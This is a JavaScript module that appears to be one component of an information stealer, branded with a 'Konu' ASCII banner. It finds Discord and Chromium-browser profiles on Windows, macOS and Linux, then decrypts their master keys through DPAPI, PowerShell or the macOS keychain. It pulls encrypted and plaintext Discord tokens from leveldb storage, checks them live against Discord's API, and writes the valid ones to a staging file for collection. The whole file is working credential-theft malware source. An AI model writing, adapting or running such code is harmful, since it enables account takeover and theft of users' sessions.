const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const os = require("os");
const { execSync } = require("child_process");

const IS_WIN = process.platform === "win32";
const IS_MAC = process.platform === "darwin";
const IS_LINUX = process.platform === "linux";

let _Dpapi = null;
function getDpapi() {
    if (!IS_WIN) return null;
    if (!_Dpapi) {
        try { _Dpapi = require("@primno/dpapi").Dpapi; } catch (_) { }
    }
    return _Dpapi;
}

function decryptMasterKey(encryptedKeyB64) {
    const masterKeyEncrypted = Buffer.from(encryptedKeyB64, "base64").subarray(5);

    if (IS_WIN) {
        const Dpapi = getDpapi();
        if (Dpapi) {
            try { return Dpapi.unprotectData(masterKeyEncrypted, null, "CurrentUser"); } catch (_) { }
        }
        try {
            const bytes = Array.from(masterKeyEncrypted).join(",");
            const ps = `$d=[System.Security.Cryptography.ProtectedData]::Unprotect([byte[]](${bytes}),$null,'CurrentUser');[Convert]::ToBase64String($d)`;
            const b64 = execSync(`powershell -NoProfile -NonInteractive -Command "${ps}"`, {
                stdio: ["pipe", "pipe", "pipe"],
                timeout: 8000,
                windowsHide: true,
            }).toString().trim();
            if (b64) return Buffer.from(b64, "base64");
        } catch (_) { }
        return null;
    }

    if (IS_MAC) {
        const keychainTargets = [
            ["Chrome", "Chrome Safe Storage"],
            ["Chromium", "Chromium Safe Storage"],
            ["Brave", "Brave Safe Storage"],
            ["Discord", "Discord Safe Storage"],
            ["Microsoft Edge", "Microsoft Edge Safe Storage"],
        ];
        for (const [account, service] of keychainTargets) {
            try {
                const pass = execSync(
                    `security find-generic-password -w -a '${account}' -s '${service}'`,
                    { stdio: ["pipe", "pipe", "pipe"], timeout: 3000 }
                ).toString().trim();
                if (pass) return crypto.pbkdf2Sync(pass, "saltysalt", 1003, 16, "sha1");
            } catch (_) { }
        }
        return null;
    }

    if (IS_LINUX) {
        try { return crypto.pbkdf2Sync("peanuts", "saltysalt", 1, 16, "sha1"); } catch (_) { return null; }
    }

    return null;
}

function decryptTokenBlob(b64Blob, masterKey) {
    try {
        const tokenData = Buffer.from(b64Blob, "base64");
        const prefix = tokenData.subarray(0, 3).toString("latin1");
        if (prefix === "v10" || prefix === "v11") {
            const iv = tokenData.subarray(3, 15);
            const middle = tokenData.subarray(15, tokenData.length - 16);
            const authTag = tokenData.subarray(tokenData.length - 16);
            const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
            decipher.setAuthTag(authTag);
            return decipher.update(middle, undefined, "utf8") + decipher.final("utf8");
        }
        const iv = Buffer.alloc(16, " ");
        const decipher = crypto.createDecipheriv("aes-128-cbc", masterKey, iv);
        return decipher.update(tokenData.subarray(3), undefined, "utf8") + decipher.final("utf8");
    } catch (_) {
        return null;
    }
}

function isLikelyValidToken(token) {
    if (typeof token !== "string") return false;

    if (token.startsWith("mfa.")) {
        return token.length > 84;
    }

    const parts = token.split(".");
    if (parts.length !== 3) return false;

    try {
        const decoded = Buffer.from(parts[0], "base64").toString("utf8");
        if (!/^\d{17,20}$/.test(decoded)) return false;
    } catch (_) {
        return false;
    }

    return true;
}

async function FindToken(basePath, name, tokens) {
    const leveldbPath = path.join(basePath, "Local Storage", "leveldb");
    if (!fs.existsSync(leveldbPath)) return;

    const isDiscordPath = name.toLowerCase().includes("discord");

    let masterKey = null;
    const localStateAtBase = path.join(basePath, "Local State");
    const localStateAtParent = path.join(path.dirname(basePath), "Local State");
    const localStatePath = fs.existsSync(localStateAtBase)
        ? localStateAtBase
        : fs.existsSync(localStateAtParent)
            ? localStateAtParent
            : null;

    if (localStatePath) {
        try {
            const localState = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
            const encKey = localState?.os_crypt?.encrypted_key;
            if (encKey) masterKey = decryptMasterKey(encKey);
        } catch (_) { }
    }

    try {
        const files = fs.readdirSync(leveldbPath);
        for (const file of files) {
            if (file.endsWith(".log") || file.endsWith(".ldb")) {
                const content = fs.readFileSync(path.join(leveldbPath, file), "latin1");
                if (isDiscordPath) {
                    if (masterKey) {
                        const encryptedPattern = /dQw4w9WgXcQ:([A-Za-z0-9+/=_-]{20,})/g;
                        let match;
                        while ((match = encryptedPattern.exec(content)) !== null) {
                            const token = decryptTokenBlob(match[1], masterKey);
                            if (token && isLikelyValidToken(token) && !tokens.find(t => t.token === token)) {
                                tokens.push({ token, location: name });
                            }
                        }
                    }
                    const plainPatterns = [/mfa\.[\w-]{84,}/g, /[\w-]{20,30}\.[\w-]{4,8}\.[\w-]{25,50}/g];
                    for (const pattern of plainPatterns) {
                        const found = content.match(pattern);
                        if (found) {
                            found.forEach(token => {
                                if (isLikelyValidToken(token) && !tokens.find(t => t.token === token)) {
                                    tokens.push({ token, location: name });
                                }
                            });
                        }
                    }
                } else {
                    if (masterKey) {
                        const encryptedPattern = /dQw4w9WgXcQ:([A-Za-z0-9+/=_-]{20,})/g;
                        let match;
                        while ((match = encryptedPattern.exec(content)) !== null) {
                            const token = decryptTokenBlob(match[1], masterKey);
                            if (token && isLikelyValidToken(token) && !tokens.find(t => t.token === token)) {
                                tokens.push({ token, location: name });
                            }
                        }
                    }
                    const mfaPattern = /mfa\.[\w-]{84,}/g;
                    const userPattern = /[\w-]{20,30}\.[\w-]{4,8}\.[\w-]{25,50}/g;
                    for (const pattern of [mfaPattern, userPattern]) {
                        const found = content.match(pattern);
                        if (found) {
                            found.forEach(token => {
                                if (isLikelyValidToken(token) && !tokens.find(t => t.token === token)) {
                                    tokens.push({ token, location: name });
                                }
                            });
                        }
                    }
                }
            }
        }
    } catch (_) { }
}

function getPlatformPaths() {
    const home = os.homedir();

    if (IS_WIN) {
        const appdata = process.env.APPDATA || path.join(home, "AppData", "Roaming");
        const localappdata = process.env.LOCALAPPDATA || path.join(home, "AppData", "Local");
        const profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Guest Profile"];
        const chromiumBrowsers = [
            { base: path.join(localappdata, "Amigo", "User Data"), name: "Amigo" },
            { base: path.join(localappdata, "Torch", "User Data"), name: "Torch" },
            { base: path.join(localappdata, "Kometa", "User Data"), name: "Kometa" },
            { base: path.join(localappdata, "Orbitum", "User Data"), name: "Orbitum" },
            { base: path.join(localappdata, "CentBrowser", "User Data"), name: "CentBrowser" },
            { base: path.join(localappdata, "7Star", "7Star", "User Data"), name: "7Star" },
            { base: path.join(localappdata, "Sputnik", "Sputnik", "User Data"), name: "Sputnik" },
            { base: path.join(localappdata, "Vivaldi", "User Data"), name: "Vivaldi" },
            { base: path.join(localappdata, "Epic Privacy Browser", "User Data"), name: "Epic Privacy Browser" },
            { base: path.join(localappdata, "uCozMedia", "Uran", "User Data"), name: "Uran" },
            { base: path.join(localappdata, "Microsoft", "Edge", "User Data"), name: "Edge" },
            { base: path.join(localappdata, "Yandex", "YandexBrowser", "User Data"), name: "Yandex" },
            { base: path.join(localappdata, "Iridium", "User Data"), name: "Iridium" },
            { base: path.join(localappdata, "Google", "Chrome SxS", "User Data"), name: "Chrome SxS" },
            { base: path.join(localappdata, "Google", "Chrome", "User Data"), name: "Chrome" },
            { base: path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"), name: "Brave" },
        ];
        const entries = [
            { path: path.join(appdata, "discord"), name: "Discord" },
            { path: path.join(appdata, "discordcanary"), name: "Discord Canary" },
            { path: path.join(appdata, "discordptb"), name: "Discord PTB" },
            { path: path.join(appdata, "discorddevelopment"), name: "Discord Development" },
            { path: path.join(appdata, "lightcord"), name: "Lightcord" },
            { path: path.join(appdata, "Opera Software", "Opera Neon"), name: "Opera Neon" },
            { path: path.join(appdata, "Opera Software", "Opera Stable"), name: "Opera Stable" },
            { path: path.join(appdata, "Opera Software", "Opera GX Stable"), name: "Opera GX Stable" },
        ];
        for (const { base, name } of chromiumBrowsers) {
            for (const profile of profiles) {
                entries.push({ path: path.join(base, profile), name: `${name} (${profile})` });
            }
        }
        return entries;
    }

    if (IS_MAC) {
        const appSupport = path.join(home, "Library", "Application Support");
        const profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Guest Profile"];
        const chromiumBrowsers = [
            { base: path.join(appSupport, "Google", "Chrome"), name: "Chrome" },
            { base: path.join(appSupport, "Google", "Chrome Canary"), name: "Chrome Canary" },
            { base: path.join(appSupport, "Chromium"), name: "Chromium" },
            { base: path.join(appSupport, "BraveSoftware", "Brave-Browser"), name: "Brave" },
            { base: path.join(appSupport, "Vivaldi"), name: "Vivaldi" },
            { base: path.join(appSupport, "Opera Software", "Opera Stable"), name: "Opera Stable" },
            { base: path.join(appSupport, "Opera Software", "Opera GX Stable"), name: "Opera GX Stable" },
            { base: path.join(appSupport, "Microsoft Edge"), name: "Edge" },
        ];
        const entries = [
            { path: path.join(appSupport, "discord"), name: "Discord" },
            { path: path.join(appSupport, "discordcanary"), name: "Discord Canary" },
            { path: path.join(appSupport, "discordptb"), name: "Discord PTB" },
        ];
        for (const { base, name } of chromiumBrowsers) {
            for (const profile of profiles) {
                entries.push({ path: path.join(base, profile), name: `${name} (${profile})` });
            }
        }
        return entries;
    }

    if (IS_LINUX) {
        const xdgConfig = process.env.XDG_CONFIG_HOME || path.join(home, ".config");
        const profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Guest Profile"];
        const chromiumBrowsers = [
            { base: path.join(xdgConfig, "google-chrome"), name: "Chrome" },
            { base: path.join(xdgConfig, "google-chrome-beta"), name: "Chrome Beta" },
            { base: path.join(xdgConfig, "google-chrome-unstable"), name: "Chrome Dev" },
            { base: path.join(xdgConfig, "chromium"), name: "Chromium" },
            { base: path.join(xdgConfig, "BraveSoftware", "Brave-Browser"), name: "Brave" },
            { base: path.join(xdgConfig, "vivaldi"), name: "Vivaldi" },
            { base: path.join(xdgConfig, "opera"), name: "Opera Stable" },
            { base: path.join(xdgConfig, "microsoft-edge"), name: "Edge" },
            { base: path.join(xdgConfig, "microsoft-edge-beta"), name: "Edge Beta" },
        ];
        const entries = [
            { path: path.join(xdgConfig, "discord"), name: "Discord" },
            { path: path.join(xdgConfig, "discordcanary"), name: "Discord Canary" },
            { path: path.join(xdgConfig, "discordptb"), name: "Discord PTB" },
            { path: path.join(home, ".discord"), name: "Discord (legacy)" },
        ];
        for (const { base, name } of chromiumBrowsers) {
            for (const profile of profiles) {
                entries.push({ path: path.join(base, profile), name: `${name} (${profile})` });
            }
        }
        return entries;
    }

    return [];
}

async function validateToken(token) {
    try {
        const res = await fetch("https://discord.com/api/v9/users/@me", {
            headers: { authorization: token },
            signal: AbortSignal.timeout(5000),
        });
        return res.ok;
    } catch (_) {
        return false;
    }
}

async function GetToken(stagingDir) {
    const paths = getPlatformPaths();
    const tokens = [];
    await Promise.all(paths.map(p => FindToken(p.path, p.name, tokens)));

    if (tokens.length === 0) return;

    const results = await Promise.allSettled(
        tokens.map(async t => {
            const valid = await validateToken(t.token);
            return valid ? t : null;
        })
    );

    const validTokens = results
        .filter(r => r.status === "fulfilled" && r.value !== null)
        .map(r => r.value);

    if (validTokens.length === 0) return;

    const discordDir = path.join(stagingDir, "Discord");
    fs.mkdirSync(discordDir, { recursive: true });

    const banner =
        " ____  __.                   \n" +
        "|    |/ _|____   ____  __ __ \n" +
        "|      < /  _ \\ /    \\|  |  \\\n" +
        "|    |  (  <_> )   |  \\  |  /\n" +
        "|____|__ \\____/|___|  /____/ \n" +
        "        \\/          \\/      \n" +
        "\n" +
        "------------------------------------------\n" +
        `Total valid tokens: ${validTokens.length}\n` +
        "------------------------------------------\n\n";

    const lines = validTokens.map(t => `[${t.location}]\n${t.token}`).join("\n\n");
    fs.writeFileSync(path.join(discordDir, "All-Tokens.txt"), banner + lines, "utf8");
}

module.exports = { GetToken };